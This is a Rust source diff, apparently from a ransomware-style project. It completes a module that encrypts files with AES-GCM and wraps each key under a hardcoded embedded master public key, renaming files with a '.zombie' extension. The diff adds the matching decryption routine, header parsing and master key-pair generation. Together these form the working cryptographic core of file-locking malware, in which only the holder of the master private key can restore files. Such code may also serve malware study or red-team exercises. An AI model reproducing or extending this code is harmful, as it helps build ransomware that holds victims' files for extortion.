@@ -14,11 +14,11 @@ use aes_gcm::{
     aead::{Aead, KeyInit, Nonce},
 };
 use hkdf::Hkdf;
-use log::{debug, info, trace};
+use log::{debug, error, info};
 use rand::{RngCore, rngs::OsRng};
-use x25519_dalek::{EphemeralSecret, PublicKey};
+use x25519_dalek::{EphemeralSecret, PublicKey, StaticSecret};
 
-use crate::error::CryptoError;
+use crate::error::{AppError, CryptoError};
 
 /// Encrypted files extension.
 pub const EXTENSION: &'static str = "zombie";
@@ -33,6 +33,14 @@ const MASTER_PUBLIC_KEY_BYTES: [u8; 32] = [
     0x8e, 0x1f, 0x5a, 0x2b, 0x9c, 0x7e, 0x4d, 0x3f, 0x6a, 0x81, 0x05, 0x3d, 0x2c, 0x1a, 0x9b, 0x0f,
     0x7e, 0x6d, 0x3a, 0x1b, 0x9f, 0x0c, 0x8e, 0x1d, 0x5b, 0x2a, 0x9d, 0x7c, 0x4e, 0x3d, 0x6b, 0x82,
 ];
+
+/// .zombie header size in bytes:
+/// - Magic.......................: 04
+/// - Version.....................: 01
+/// - Ephemeral PK................: 32
+/// - Encrypted AES key (with tag): 48 (32 + 16)
+/// - File content AES-GCM nonce..: 12
+const ZOMBIE_HEADER_SIZE: usize = 4 + 1 + 32 + 48 + 12; // = 97 bytes
 
 /// Encrypts a file using AES-GCM for content and ECIES-like key encapsulation
 /// for the AES key using Curve25519--x25519-dalek.
@@ -73,7 +81,7 @@ pub fn encrypt(path: &Path) -> Result<PathBuf, CryptoError> {
     let mut file_aes_nonce_bytes = [0u8; 12]; // 12-byte long nonce
     OsRng.try_fill_bytes(&mut file_aes_nonce_bytes)?;
     let file_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&file_aes_nonce_bytes);
-    trace!("Generated AES-GCM key and nonce for file content");
+    debug!("Generated AES-GCM key and nonce for file content");
 
     // 3. Encrypt file content with AES-GCM
     let ciphertext_with_tag = cipher_file_aes_gcm
@@ -147,12 +155,6 @@ pub fn encrypt(path: &Path) -> Result<PathBuf, CryptoError> {
     let mut output_file = File::create(&zombie_path)?;
 
     // 6. Write the header to the .zombie file
-    // .zombie header size in bytes:
-    // - Magic.......................: 04
-    // - Version.....................: 01
-    // - Ephemeral PK................: 32
-    // - Encrypted AES key (with tag): 48 (32 + 16)
-    // - File content AES-GCM nonce..: 12
     output_file.write_all(MAGIC_BYTES)?;
     output_file.write_all(&[FILE_FORMAT_VERSION])?;
     output_file.write_all(ephemeral_public.as_bytes())?;
@@ -191,11 +193,216 @@ pub fn decrypt(path: &Path, key: &Path) -> Result<PathBuf, CryptoError> {
     info!("Starting decryption for file: {:?}", path);
 
     // 1. Read the master private key
+    let mut private_key_file = File::open(key)?;
+    let mut master_private_key_bytes = Vec::new();
+    private_key_file.read_to_end(&mut master_private_key_bytes)?; // shouldn't it have to transform the key?
+
+    if master_private_key_bytes.len() != 32 {
+        error!(
+            "Master private key files has invalid length: {} bytes",
+            master_private_key_bytes.len()
+        );
+        return Err(CryptoError::InvalidPrivateKey);
+    }
+    let master_private_key = StaticSecret::from(
+        <[u8; 32]>::try_from(master_private_key_bytes.as_slice())
+            .map_err(|_| CryptoError::InvalidPrivateKey)?,
+    );
+    debug!("Loaded master private key from {:?}", key);
+
     // 2. Read the .zombie file header
+    let mut encrypted_file = File::open(path)?;
+    let mut header_bytes = [0u8; ZOMBIE_HEADER_SIZE];
+    encrypted_file.read_exact(&mut header_bytes)?;
+    debug!("Read header bytes from {:?}", path);
+
     // 3. Parse header
+    let mut cursor = io::Cursor::new(header_bytes);
+
+    // Magic bytes
+    let mut magic_read = [0u8; 4];
+    cursor
+        .read_exact(&mut magic_read)
+        .map_err(|_| CryptoError::InvalidZombieFile("Failed to read magic bytes".to_string()))?;
+    if &magic_read != MAGIC_BYTES {
+        error!("Invalid magic bytes found in header");
+        return Err(CryptoError::InvalidZombieFile(
+            "Invalid magic bytes".to_string(),
+        ));
+    }
+    debug!("Magic bytes verified");
+
+    // Version
+    let mut version_read = [0u8; 1];
+    cursor
+        .read_exact(&mut version_read)
+        .map_err(|_| CryptoError::InvalidZombieFile("Failed to read version byte".to_string()))?;
+    if version_read[0] != FILE_FORMAT_VERSION {
+        error!(
+            "Unsupported file format version: {}, expected {}",
+            version_read[0], FILE_FORMAT_VERSION
+        );
+        return Err(CryptoError::InvalidZombieFile(
+            "Unsupported version".to_string(),
+        ));
+    }
+    debug!("File format version verified");
+
+    // Ephemeral public key (32 bytes)
+    let mut ephemeral_public_key = [0u8; 32];
+    cursor.read_exact(&mut ephemeral_public_key).map_err(|_| {
+        CryptoError::InvalidZombieFile("Failed to read ephemeral public key".to_string())
+    })?;
+
+    // Encrypted file AES key (+ 16 byte tag)
+    let mut encrypted_file_aes_key_with_tag = [0u8; 48];
+    cursor
+        .read_exact(&mut encrypted_file_aes_key_with_tag)
+        .map_err(|_| {
+            CryptoError::InvalidZombieFile("Failed to read encrypted AES key".to_string())
+        })?;
+
+    // AES-GCM nonce for key encapsulation
+    let mut key_enc_aes_nonce_bytes = [0u8; 12];
+    cursor
+        .read_exact(&mut key_enc_aes_nonce_bytes)
+        .map_err(|_| {
+            CryptoError::InvalidZombieFile(
+                "Failed to read AES-GCM nonce for key encapsulation".to_string(),
+            )
+        })?;
+    let key_enc_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&key_enc_aes_nonce_bytes);
+
+    // AES-GCM nonce for file content
+    let mut file_aes_nonce_bytes = [0u8; 12];
+    cursor.read_exact(&mut file_aes_nonce_bytes).map_err(|_| {
+        CryptoError::InvalidZombieFile("Failed to read AES-GCM nonce for file content".to_string())
+    })?;
+    let file_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&file_aes_nonce_bytes);
+
+    debug!("Parsed .zombie header");
+
+    // Ciphertext + AES-GCM tag extraction
+    let mut file_content_ciphertext_with_tag = Vec::new();
+    encrypted_file.read_to_end(&mut file_content_ciphertext_with_tag)?;
+    debug!(
+        "Read ciphertext+tag. Size: {}",
+        file_content_ciphertext_with_tag.len()
+    );
+
     // 4. ECIES-like decapsulation for the file AES key (with AES-GCM)
+    let ephemeral_public = PublicKey::from(ephemeral_public_key);
+    let shared_secret = master_private_key.diffie_hellman(&ephemeral_public);
+    debug!("Derived shared secret with ECDH");
+
+    let hkdf = Hkdf::<sha2::Sha256>::new(None, shared_secret.as_bytes());
+    let mut key_enc_aes_key_derived_bytes = [0u8; 32];
+    hkdf.expand(
+        b"key_encapsulation_aes_key_derivation",
+        &mut key_enc_aes_key_derived_bytes,
+    )
+    .map_err(|_| CryptoError::KdfError)?;
+    let key_enc_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_enc_aes_key_derived_bytes);
+    let cipher_key_enc_aes_gcm = Aes256Gcm::new(key_enc_aes_key);
+    debug!("Derived AES-GCM key for key encapsulation decryption");
+
+    let file_aes_key_bytes = cipher_key_enc_aes_gcm
+        .decrypt(key_enc_aes_nonce, encrypted_file_aes_key_with_tag.as_ref())
+        .map_err(|e| {
+            if e.to_string().contains("tag verification failed") {
+                CryptoError::AuthenticationTagMismatch
+            } else {
+                CryptoError::SymmetricDecryptError(format!(
+                    "AES-GCM decryption of file AES key failed: {:?}",
+                    e
+                ))
+            }
+        })?;
+    let file_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&file_aes_key_bytes);
+    let cipher_file_aes_gcm = Aes256Gcm::new(file_aes_key);
+    debug!("File AES key decrypted");
+
     // 5. Decrypt file content with AES-GCM
+    let plaintext = cipher_file_aes_gcm
+        .decrypt(file_aes_nonce, file_content_ciphertext_with_tag.as_ref())
+        .map_err(|e| {
+            if e.to_string().contains("tag verification failed") {
+                CryptoError::AuthenticationTagMismatch
+            } else {
+                CryptoError::SymmetricDecryptError(format!(
+                    "AES-GCM decryption of file content failed: {:?}",
+                    e
+                ))
+            }
+        })?;
+    debug!(
+        "File content decrypted. Plaintext size: {}",
+        plaintext.len()
+    );
+
     // 6. Construct the decrypted file path
+    let mut decrypted_path = path.to_path_buf();
+    // only .zombie files
+    if decrypted_path
+        .extension()
+        .map_or(false, |ext| ext == EXTENSION)
+    {
+        let mut original_file_name = decrypted_path
+            .file_stem()
+            .ok_or_else(|| {
+                CryptoError::Io(io::Error::new(
+                    io::ErrorKind::InvalidInput,
+                    "Invalid file stem for decryption",
+                ))
+            })?
+            .to_os_string();
+
+        let original_extension = path
+            .file_name()
+            .and_then(|name| name.to_str())
+            .and_then(|name_str| name_str.strip_suffix(&format!(".{}", EXTENSION)))
+            .and_then(|stripped_name| Path::new(stripped_name).extension());
+
+        if let Some(ext) = original_extension {
+            original_file_name.push(".");
+            original_file_name.push(ext);
+        }
+        decrypted_path.set_file_name(original_file_name);
+    }
+    info!("Creating decrypted file: {:?}", decrypted_path);
+
     // 7. Write decrypted content to the new file
-    Ok(path.to_path_buf())
+    let mut output_file = File::create(&decrypted_path)?;
+    output_file.write_all(&plaintext)?;
+    info!("Decrypted content written to file");
+
+    Ok(decrypted_path)
+}
+
+/// Generates a new master Curve25519 key pair (public and private).
+///
+/// The public key is returned as a byte array, suitable for embedding as
+/// `MASTER_PUBLIC_KEY_BYTES`. The private key is saved to a specified file
+/// path.
+///
+/// # Arguments
+/// - `private_key_path`: The path to save the generated master private key.
+///
+/// # Returns
+/// A `Result` containing the generated master public key bytes (`[u8; 32]`)
+/// on success or a `AppError` if key generation or file saving fails.
+pub fn generate(private_key_path: &Path) -> Result<(), AppError> {
+    info!("Generating new master key pair");
+
+    let master_private_key = StaticSecret::random_from_rng(OsRng);
+
+    let master_public_key: PublicKey = (&master_private_key).into();
+    let public_key_bytes = master_public_key.to_bytes();
+
+    let mut file = File::create(private_key_path)?;
+    file.write_all(master_private_key.to_bytes().as_ref())?;
+    info!("Master private key saved to: {:?}", private_key_path);
+    debug!("Generated public key (bytes): {:?}", public_key_bytes);
+
+    Ok(())
 }
